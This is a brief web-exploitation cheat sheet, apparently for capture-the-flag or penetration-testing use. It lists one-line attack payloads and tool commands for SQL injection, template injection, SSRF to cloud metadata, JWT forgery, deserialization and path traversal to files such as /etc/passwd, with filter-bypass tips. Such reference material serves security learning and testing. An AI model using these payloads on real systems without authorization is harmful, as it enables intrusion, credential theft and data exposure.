# Web Exploitation Techniques

## SQL injection
**When:** User input reflected in a database query; error messages leak DB type.
**Tools:** `sqlmap -u 'url?id=1' --dbs`, manual `' OR 1=1--`, `' UNION SELECT null,null--`
**Caveats:** Always URL-encode payloads; try both GET and POST; WAF may need tampers.

## Server-Side Template Injection (SSTI)
**When:** User input reflected in a page that renders templates (Jinja2, Twig, Pebble).
**Tools:** `{{7*7}}` probe; Jinja2: `{{config}}`, `{{''.__class__.__mro__[1].__subclasses__()}}`
**Caveats:** Different engines differ; Jinja2 vs Twig vs Freemarker have different syntax.

## SSRF
**When:** App fetches a URL from user input; may reach internal services.
**Tools:** `http://169.254.169.254/` (AWS metadata), `http://localhost/admin`
**Caveats:** Try `http://0/`, `http://[::1]/`, DNS rebinding; filter bypass with redirects.

## JWT attacks
**When:** API uses JSON Web Tokens; check for `alg: none`, weak secrets, key confusion.
**Tools:** `jwt_tool`, `hashcat -a 3 -m 16500`, manual base64 decode + re-sign.
**Caveats:** `alg: HS256` with RSA public key in secret = key confusion; `alg: none` with blank sig.

## Insecure deserialization
**When:** App deserialises user-controlled data (Python pickle, Java ObjectInputStream).
**Tools:** `ysoserial` (Java), `pickle.dumps` chain (Python), `phpggc` (PHP)
**Caveats:** Need gadget chain compatible with target library versions.

## Path traversal / LFI
**When:** File inclusion from user-controlled path; `../` sequences not filtered.
**Tools:** `../../etc/passwd`, `....//....//etc/passwd`, `%2e%2e%2f`
**Caveats:** PHP wrappers: `php://filter/convert.base64-encode/resource=index.php`
